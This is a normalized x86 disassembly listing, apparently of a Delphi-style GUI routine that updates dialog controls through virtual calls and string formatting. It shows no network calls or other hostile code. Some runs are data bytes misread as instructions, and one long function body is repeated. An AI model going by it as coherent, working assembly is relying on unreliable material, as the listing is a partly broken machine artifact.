mov edx [ esi + 0x8 ]
test edx edx
jne r-xdata
mov [ ebx + 0x478 ] 0x1
mov [ ebx + 0x478 ] 0x1
jmp r-xdata
dec edx
je r-xdata
xor [ eax ] al
add [ eax ] al
add [ eax ] al
mov bh 0x0
inc eax
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
sbb [ eax ] al
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
add [ eax ] al
add eax [ eax ]
mov dl 0x1
mov eax [ ebx + 0x434 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov dl 0x1
mov eax [ ebx + 0x448 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor edx edx
mov eax [ ebx + 0x434 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor edx edx
mov eax [ ebx + 0x448 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
jmp r-xdata
mov [ ebx + 0x478 ] 0x2
jmp r-xdata
mov edx 0x64
mov eax [ ebx + 0x40c ]
call sub_4a6714
mov edx [ esi + 0x38 ]
mov eax [ ebx + 0x40c ]
call sub_4a6714
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
mov eax [ ebx + 0x438 ]
setne dl
mov ecx [ eax ]
and edx 0x1
call [ ecx + 0xe0 ]
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x44c ]
test edx edx
setne dl
mov ecx [ eax ]
and edx 0x1
call [ ecx + 0xe0 ]
mov eax [ esi + 0xc ]
mov [ ebx + 0x47c ] eax
mov edx [ esi + 0x10 ]
mov [ ebx + 0x480 ] edx
mov ecx [ esi + 0x14 ]
mov [ ebx + 0x484 ] ecx
mov [ ebp - 0x4c ] 0xc
mov eax [ ebx + 0x47c ]
push eax
call sub_40d614
pop ecx
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4d3010
inc [ ebp - 0x40 ]
mov edx [ eax ]
mov eax [ ebx + 0x3a4 ]
call sub_48dfa0
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x4c ] 0x18
mov ecx [ ebx + 0x480 ]
push ecx
call sub_40d614
pop ecx
mov edx eax
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0x40 ]
mov edx [ eax ]
mov eax [ ebx + 0x3a8 ]
call sub_48dfa0
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x4c ] 0x24
mov ecx [ ebx + 0x484 ]
push ecx
call sub_40d614
pop ecx
mov edx eax
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x40 ]
mov edx [ eax ]
mov eax [ ebx + 0x3ac ]
call sub_48dfa0
dec [ ebp - 0x40 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
xor edx edx
mov eax [ ebx + 0x3bc ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor edx edx
mov eax [ ebx + 0x3c0 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov edx [ esi + 0x18 ]
mov eax [ ebx + 0x46c ]
call sub_4a6714
mov edx [ esi + 0x1c ]
mov eax [ ebx + 0x464 ]
call sub_4a6714
mov edx [ esi + 0x20 ]
mov eax [ ebx + 0x468 ]
call sub_4a6714
mov [ ebp - 0x4c ] 0x30
mov ecx [ ebx + 0x46c ]
mov edi [ ecx + 0x280 ]
xor eax eax
mov [ ebp - 0x10 ] eax
push edi
push rw-data
lea edx [ ebp - 0x10 ]
push edx
call sub_4d3324
add esp 0xc
lea ecx [ ebp - 0x10 ]
inc [ ebp - 0x40 ]
mov edx [ ecx ]
mov eax [ ebx + 0x3d4 ]
call sub_48dfa0
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x4c ] 0x3c
mov ecx [ ebx + 0x464 ]
mov edi [ ecx + 0x280 ]
neg edi
xor eax eax
mov [ ebp - 0x14 ] eax
push edi
push rw-data
lea edx [ ebp - 0x14 ]
push edx
call sub_4d3324
add esp 0xc
lea ecx [ ebp - 0x14 ]
inc [ ebp - 0x40 ]
mov edx [ ecx ]
mov eax [ ebx + 0x3d8 ]
call sub_48dfa0
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x4c ] 0x48
mov ecx [ ebx + 0x468 ]
mov edi [ ecx + 0x280 ]
neg edi
xor eax eax
mov [ ebp - 0x18 ] eax
push edi
push rw-data
lea edx [ ebp - 0x18 ]
push edx
call sub_4d3324
add esp 0xc
lea ecx [ ebp - 0x18 ]
inc [ ebp - 0x40 ]
mov edx [ ecx ]
mov eax [ ebx + 0x3e0 ]
call sub_48dfa0
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
mov ecx [ esi + 0x24 ]
mov eax [ ebx + 0x3e8 ]
test ecx ecx
setne dl
mov ecx [ eax ]
and edx 0x1
call [ ecx + 0xe0 ]
mov eax [ esi + 0x28 ]
test eax eax
mov eax [ ebx + 0x3f0 ]
setne dl
mov ecx [ eax ]
and edx 0x1
call [ ecx + 0xe0 ]
mov edx [ esi + 0x2c ]
mov eax [ ebx + 0x3ec ]
test edx edx
setne dl
mov ecx [ eax ]
and edx 0x1
call [ ecx + 0xe0 ]
mov edx [ esi + 0x30 ]
mov eax [ ebx + 0x45c ]
call sub_4a6714
fld [ esi + 0x34 ]
fmul [ r-xdata ]
fadd [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
call sub_4ccc6c
add esp 0x8
call sub_4ccca0
mov edx eax
mov eax [ ebx + 0x460 ]
call sub_4a6714
mov edx [ esi ]
cmp edx 0x4
jne r-xdata
mov ecx [ ebp - 0x60 ]
mov eax [ ecx + 0x4 ]
mov edx [ ebp - 0x64 ]
cmp eax edx
jg r-xdata
mov eax [ ebx + 0x414 ]
add eax 0x29c
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edi [ ebx + 0x414 ]
mov edx rw-data
mov [ ebp - 0x4c ] 0x54
add edi 0x29c
lea eax [ ebp - 0x1c ]
call sub_4d3010
inc [ ebp - 0x40 ]
mov edx [ eax ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x470 ]
inc ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
mov edi [ ebx + 0x414 ]
xor edx edx
mov [ ebp - 0x4c ] 0x60
mov eax [ ebp - 0x64 ]
add edi 0x29c
inc eax
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x20 ] edx
inc [ ebp - 0x40 ]
lea eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x68 ]
push ecx
push rw-data
push eax
call sub_402d3c
add esp 0xc
lea edx [ ebp - 0x20 ]
inc [ ebp - 0x40 ]
xor ecx ecx
mov [ ebp - 0x24 ] ecx
inc [ ebp - 0x40 ]
lea ecx [ ebp - 0x24 ]
inc [ ebp - 0x40 ]
mov eax rw-data
call sub_402d5c
xor edx edx
mov [ ebp - 0x28 ] edx
lea edx [ ebp - 0x24 ]
lea eax [ ebp - 0x28 ]
call sub_41e604
lea ecx [ ebp - 0x28 ]
inc [ ebp - 0x40 ]
mov edx [ ecx ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x40 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x24 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x40 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x20 ]
xor edx edx
call sub_4d2728
inc [ ebp - 0x64 ]
xor edx edx
mov eax [ ebx + 0x414 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax [ esi ]
cmp eax 0x5
jne r-xdata
mov eax [ ebx + 0x420 ]
add eax 0x29c
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edi [ ebx + 0x420 ]
mov edx rw-data
mov [ ebp - 0x4c ] 0x6c
add edi 0x29c
lea eax [ ebp - 0x2c ]
call sub_4d3010
inc [ ebp - 0x40 ]
mov edx [ eax ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_4d318c
xor ecx ecx
mov [ ebp - 0x6c ] ecx
jmp r-xdata
mov edx [ esi + 0x38 ]
mov ecx [ ebx + 0x470 ]
cmp edx ecx
jle r-xdata
mov ecx [ rw-data ]
mov eax [ ecx ]
mov edi [ eax + 0x44c ]
add edi 0x270
mov eax [ edi ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx [ ebp - 0x6c ]
cmp eax ecx
jg r-xdata
mov edx [ esi + 0x38 ]
mov eax [ ebx + 0x470 ]
sub edx eax
mov eax [ ebx + 0x414 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax [ ebx + 0x420 ]
mov edx [ rw-data ]
add eax 0x29c
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x4c ] 0x78
mov ecx [ edx ]
xor edx edx
mov eax [ ecx + 0x44c ]
lea ecx [ ebp - 0x30 ]
add eax 0x270
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x30 ] edx
inc [ ebp - 0x40 ]
mov eax [ ebp - 0x74 ]
mov edx [ ebp - 0x6c ]
mov eax [ eax ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x70 ]
lea edx [ ebp - 0x30 ]
mov eax [ eax ]
mov edx [ edx ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x30 ]
mov edx 0x2
call sub_4d318c
inc [ ebp - 0x6c ]
xor edx edx
mov eax [ ebx + 0x420 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax [ esi ]
cmp eax 0x6
jne r-xdata
mov eax [ ebx + 0x478 ]
dec eax
je r-xdata
mov [ ebp - 0x4c ] 0x84
mov edx rw-data
lea eax [ ebp - 0x34 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x40 ]
inc [ ebp - 0x40 ]
lea edx [ ebp - 0x34 ]
lea eax [ esi + 0x3c ]
call sub_4d27cc
test al al
setne dl
and edx 0x1
push edx
dec [ ebp - 0x40 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x34 ]
xor edx edx
call sub_4d2728
pop ecx
test ecx ecx
je r-xdata
mov eax [ ebx + 0x3a4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
jmp r-xdata
dec eax
je r-xdata
mov eax [ rw-data ]
add esi 0x3c
mov edx [ eax ]
mov edi [ edx + 0x44c ]
mov [ ebp - 0x4c ] 0x9c
add edi 0x270
xor eax eax
mov [ ebp - 0x78 ] esi
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x38 ]
mov edx [ ebp - 0x78 ]
call sub_41e604
lea ecx [ ebp - 0x38 ]
inc [ ebp - 0x40 ]
mov edx [ ecx ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x4c ] 0x90
test esi esi
jl r-xdata
mov eax ebx
call sub_40323c
mov edx [ ebp - 0x5c ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x46c ]
mov edx [ eax ]
call [ edx + 0xd8 ]
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebp - 0x4c ] 0x0
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x420 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax [ ebx + 0x40c ]
mov edx [ eax ]
call [ edx + 0xd8 ]
jmp r-xdata
sub_40257c
add al 0x0
add [ eax ] al
nop
add [ eax + eax ] cl
mov al [ 0x54004040 ]
inc ecx
jae r-xdata
dec edx
je r-xdata
imul esp [ edi + 0x6e ] 0x6c616944
outsd
and [ bp + si ] ch
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff88
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov [ ebp - 0x60 ] ecx
imul eax [ ebx + 0x470 ] 0x1a90
mov esi [ ebx + 0x474 ]
mov edx [ ebp - 0x60 ]
shl esi 0x2
add eax edx
add eax 0x8
lea esi [ esi + esi * 4 ]
lea esi [ esi + esi * 4 ]
add esi eax
mov eax [ ebx + 0x388 ]
mov eax [ eax + 0x2c4 ]
call sub_4a4e2c
mov [ ebx + 0x478 ] eax
mov edx [ esi ]
sub edx 0x1
jb r-xdata
mov [ ebx + 0x478 ] 0x1
jmp r-xdata
jmp r-xdata
mov ecx [ ebx + 0x478 ]
test ecx ecx
jne r-xdata
je r-xdata
mov [ ebx + 0x478 ] 0x4
mov edx [ ebx + 0x478 ]
mov edi [ ebx + 0x388 ]
mov eax edi
call sub_4a5850
mov edx eax
mov eax edi
call sub_4a5a04
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_403db0
mov edx eax
mov eax [ ebx + 0x430 ]
call sub_4a6714
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_403db0
mov edx eax
mov eax [ ebx + 0x444 ]
call sub_4a6714
mov edx [ ebx + 0x430 ]
mov eax ebx
call sub_403b20
mov edx [ ebx + 0x444 ]
mov eax ebx
call sub_403b20
mov edx [ esi + 0x8 ]
test edx edx
jne r-xdata
mov [ ebx + 0x478 ] 0x1
mov [ ebx + 0x478 ] 0x1
jmp r-xdata
dec edx
je r-xdata
mov dl 0x1
mov eax [ ebx + 0x434 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov dl 0x1
mov eax [ ebx + 0x448 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor edx edx
mov eax [ ebx + 0x434 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor edx edx
mov eax [ ebx + 0x448 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
jmp r-xdata
mov [ ebx + 0x478 ] 0x2
jmp r-xdata
mov edx 0x64
mov eax [ ebx + 0x40c ]
call sub_4a6714
mov edx [ esi + 0x38 ]
mov eax [ ebx + 0x40c ]
call sub_4a6714
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
mov eax [ ebx + 0x438 ]
setne dl
mov ecx [ eax ]
and edx 0x1
call [ ecx + 0xe0 ]
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x44c ]
test edx edx
setne dl
mov ecx [ eax ]
and edx 0x1
call [ ecx + 0xe0 ]
mov eax [ esi + 0xc ]
mov [ ebx + 0x47c ] eax
mov edx [ esi + 0x10 ]
mov [ ebx + 0x480 ] edx
mov ecx [ esi + 0x14 ]
mov [ ebx + 0x484 ] ecx
mov [ ebp - 0x4c ] 0xc
mov eax [ ebx + 0x47c ]
push eax
call sub_40d614
pop ecx
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4d3010
inc [ ebp - 0x40 ]
mov edx [ eax ]
mov eax [ ebx + 0x3a4 ]
call sub_48dfa0
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x4c ] 0x18
mov ecx [ ebx + 0x480 ]
push ecx
call sub_40d614
pop ecx
mov edx eax
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0x40 ]
mov edx [ eax ]
mov eax [ ebx + 0x3a8 ]
call sub_48dfa0
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x4c ] 0x24
mov ecx [ ebx + 0x484 ]
push ecx
call sub_40d614
pop ecx
mov edx eax
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x40 ]
mov edx [ eax ]
mov eax [ ebx + 0x3ac ]
call sub_48dfa0
dec [ ebp - 0x40 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
xor edx edx
mov eax [ ebx + 0x3bc ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor edx edx
mov eax [ ebx + 0x3c0 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov edx [ esi + 0x18 ]
mov eax [ ebx + 0x46c ]
call sub_4a6714
mov edx [ esi + 0x1c ]
mov eax [ ebx + 0x464 ]
call sub_4a6714
mov edx [ esi + 0x20 ]
mov eax [ ebx + 0x468 ]
call sub_4a6714
mov [ ebp - 0x4c ] 0x30
mov ecx [ ebx + 0x46c ]
mov edi [ ecx + 0x280 ]
xor eax eax
mov [ ebp - 0x10 ] eax
push edi
push rw-data
lea edx [ ebp - 0x10 ]
push edx
call sub_4d3324
add esp 0xc
lea ecx [ ebp - 0x10 ]
inc [ ebp - 0x40 ]
mov edx [ ecx ]
mov eax [ ebx + 0x3d4 ]
call sub_48dfa0
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x4c ] 0x3c
mov ecx [ ebx + 0x464 ]
mov edi [ ecx + 0x280 ]
neg edi
xor eax eax
mov [ ebp - 0x14 ] eax
push edi
push rw-data
lea edx [ ebp - 0x14 ]
push edx
call sub_4d3324
add esp 0xc
lea ecx [ ebp - 0x14 ]
inc [ ebp - 0x40 ]
mov edx [ ecx ]
mov eax [ ebx + 0x3d8 ]
call sub_48dfa0
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x4c ] 0x48
mov ecx [ ebx + 0x468 ]
mov edi [ ecx + 0x280 ]
neg edi
xor eax eax
mov [ ebp - 0x18 ] eax
push edi
push rw-data
lea edx [ ebp - 0x18 ]
push edx
call sub_4d3324
add esp 0xc
lea ecx [ ebp - 0x18 ]
inc [ ebp - 0x40 ]
mov edx [ ecx ]
mov eax [ ebx + 0x3e0 ]
call sub_48dfa0
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
mov ecx [ esi + 0x24 ]
mov eax [ ebx + 0x3e8 ]
test ecx ecx
setne dl
mov ecx [ eax ]
and edx 0x1
call [ ecx + 0xe0 ]
mov eax [ esi + 0x28 ]
test eax eax
mov eax [ ebx + 0x3f0 ]
setne dl
mov ecx [ eax ]
and edx 0x1
call [ ecx + 0xe0 ]
mov edx [ esi + 0x2c ]
mov eax [ ebx + 0x3ec ]
test edx edx
setne dl
mov ecx [ eax ]
and edx 0x1
call [ ecx + 0xe0 ]
mov edx [ esi + 0x30 ]
mov eax [ ebx + 0x45c ]
call sub_4a6714
fld [ esi + 0x34 ]
fmul [ r-xdata ]
fadd [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
call sub_4ccc6c
add esp 0x8
call sub_4ccca0
mov edx eax
mov eax [ ebx + 0x460 ]
call sub_4a6714
mov edx [ esi ]
cmp edx 0x4
jne r-xdata
mov ecx [ ebp - 0x60 ]
mov eax [ ecx + 0x4 ]
mov edx [ ebp - 0x64 ]
cmp eax edx
jg r-xdata
mov eax [ ebx + 0x414 ]
add eax 0x29c
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edi [ ebx + 0x414 ]
mov edx rw-data
mov [ ebp - 0x4c ] 0x54
add edi 0x29c
lea eax [ ebp - 0x1c ]
call sub_4d3010
inc [ ebp - 0x40 ]
mov edx [ eax ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x470 ]
inc ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
mov edi [ ebx + 0x414 ]
xor edx edx
mov [ ebp - 0x4c ] 0x60
mov eax [ ebp - 0x64 ]
add edi 0x29c
inc eax
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x20 ] edx
inc [ ebp - 0x40 ]
lea eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x68 ]
push ecx
push rw-data
push eax
call sub_402d3c
add esp 0xc
lea edx [ ebp - 0x20 ]
inc [ ebp - 0x40 ]
xor ecx ecx
mov [ ebp - 0x24 ] ecx
inc [ ebp - 0x40 ]
lea ecx [ ebp - 0x24 ]
inc [ ebp - 0x40 ]
mov eax rw-data
call sub_402d5c
xor edx edx
mov [ ebp - 0x28 ] edx
lea edx [ ebp - 0x24 ]
lea eax [ ebp - 0x28 ]
call sub_41e604
lea ecx [ ebp - 0x28 ]
inc [ ebp - 0x40 ]
mov edx [ ecx ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x40 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x24 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x40 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x20 ]
xor edx edx
call sub_4d2728
inc [ ebp - 0x64 ]
xor edx edx
mov eax [ ebx + 0x414 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax [ esi ]
cmp eax 0x5
jne r-xdata
mov eax [ ebx + 0x420 ]
add eax 0x29c
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edi [ ebx + 0x420 ]
mov edx rw-data
mov [ ebp - 0x4c ] 0x6c
add edi 0x29c
lea eax [ ebp - 0x2c ]
call sub_4d3010
inc [ ebp - 0x40 ]
mov edx [ eax ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_4d318c
xor ecx ecx
mov [ ebp - 0x6c ] ecx
jmp r-xdata
mov edx [ esi + 0x38 ]
mov ecx [ ebx + 0x470 ]
cmp edx ecx
jle r-xdata
mov ecx [ rw-data ]
mov eax [ ecx ]
mov edi [ eax + 0x44c ]
add edi 0x270
mov eax [ edi ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx [ ebp - 0x6c ]
cmp eax ecx
jg r-xdata
mov edx [ esi + 0x38 ]
mov eax [ ebx + 0x470 ]
sub edx eax
mov eax [ ebx + 0x414 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax [ ebx + 0x420 ]
mov edx [ rw-data ]
add eax 0x29c
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x4c ] 0x78
mov ecx [ edx ]
xor edx edx
mov eax [ ecx + 0x44c ]
lea ecx [ ebp - 0x30 ]
add eax 0x270
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x30 ] edx
inc [ ebp - 0x40 ]
mov eax [ ebp - 0x74 ]
mov edx [ ebp - 0x6c ]
mov eax [ eax ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x70 ]
lea edx [ ebp - 0x30 ]
mov eax [ eax ]
mov edx [ edx ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x30 ]
mov edx 0x2
call sub_4d318c
inc [ ebp - 0x6c ]
xor edx edx
mov eax [ ebx + 0x420 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax [ esi ]
cmp eax 0x6
jne r-xdata
mov eax [ ebx + 0x478 ]
dec eax
je r-xdata
mov [ ebp - 0x4c ] 0x84
mov edx rw-data
lea eax [ ebp - 0x34 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x40 ]
inc [ ebp - 0x40 ]
lea edx [ ebp - 0x34 ]
lea eax [ esi + 0x3c ]
call sub_4d27cc
test al al
setne dl
and edx 0x1
push edx
dec [ ebp - 0x40 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x34 ]
xor edx edx
call sub_4d2728
pop ecx
test ecx ecx
je r-xdata
mov eax [ ebx + 0x3a4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
jmp r-xdata
dec eax
je r-xdata
mov eax [ rw-data ]
add esi 0x3c
mov edx [ eax ]
mov edi [ edx + 0x44c ]
mov [ ebp - 0x4c ] 0x9c
add edi 0x270
xor eax eax
mov [ ebp - 0x78 ] esi
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x38 ]
mov edx [ ebp - 0x78 ]
call sub_41e604
lea ecx [ ebp - 0x38 ]
inc [ ebp - 0x40 ]
mov edx [ ecx ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x4c ] 0x90
test esi esi
jl r-xdata
mov eax ebx
call sub_40323c
mov edx [ ebp - 0x5c ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x46c ]
mov edx [ eax ]
call [ edx + 0xd8 ]
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebp - 0x4c ] 0x0
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x420 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax [ ebx + 0x40c ]
mov edx [ eax ]
call [ edx + 0xd8 ]
jmp r-xdata
sub_402d3c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
mov edx [ ebp + 0xc ]
push edx
push 0x0
push ebx
call sub_4d27e4
add esp 0x10
mov eax ebx
pop ebx
pop ebp
retn
sub_402d5c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x20 ] 0xc
mov eax ebx
lea edx [ ebp - 0x4 ]
mov ecx edx
xor edx edx
xchg ecx eax
xchg ecx edx
call sub_4d25d8
inc [ ebp - 0x14 ]
inc [ ebp - 0x14 ]
xor ecx ecx
mov [ ebp - 0x20 ] 0x18
mov [ ebp - 0x20 ] 0x24
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
inc [ ebp - 0x14 ]
inc [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_402e08
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4d2758
mov eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] 0x30
push eax
dec [ ebp - 0x14 ]
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x14 ]
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
pop eax
mov [ ebp - 0x20 ] 0x24
add [ ebp - 0x14 ] 0x2
mov edx [ ebp - 0x30 ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_402e08
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x1c ] 0xc
xor edx edx
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edx
mov edx ebx
inc [ ebp - 0x10 ]
inc [ ebp - 0x10 ]
mov ecx esi
mov [ ebp - 0x1c ] 0x18
call sub_4d278c
mov [ ebp - 0x1c ] 0x24
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4d2758
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] 0x30
push eax
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
pop eax
mov [ ebp - 0x1c ] 0x24
add [ ebp - 0x10 ] 0x2
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_402e8c
add al 0x0
add [ eax ] al
nop
add [ eax + eax ] cl
je r-xdata
fdivr [ eax + rw-data ]
inc eax
add [ ecx + 0x6e ] al
jae r-xdata
mov eax [ ebx + 0x478 ]
cmp eax 0x2
jne r-xdata
mov ecx [ ebx + 0x47c ]
test ecx ecx
je r-xdata
add [ ebx + 0x47883 ] cl
add [ ebx + 0x6c7502f8 ] al
push ebx
je r-xdata
mov ecx [ ebx + 0x478 ]
cmp ecx 0x4
jne r-xdata
mov edx [ ebx + 0x46c ]
mov ecx [ edx + 0x280 ]
test ecx ecx
jne r-xdata
mov [ esi ] 0x1
mov [ esi ] 0x2
mov eax [ ebx + 0x464 ]
mov edx [ eax + 0x280 ]
test edx edx
jne r-xdata
call sub_4c517c
mov edx [ rw-data ]
mov eax [ edx + 0x8 ]
mov [ eax ] 0x1
imul edx [ ebx + 0x470 ] 0x1a90
mov esi [ ebx + 0x474 ]
add eax edx
shl esi 0x2
add eax 0x8
lea esi [ esi + esi * 4 ]
lea esi [ esi + esi * 4 ]
add esi eax
xor eax eax
mov [ esi ] eax
mov edx [ ebx + 0x478 ]
dec edx
jne r-xdata
imul ebp [ esi + 0x67 ] 0x90002a20
nop
nop
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
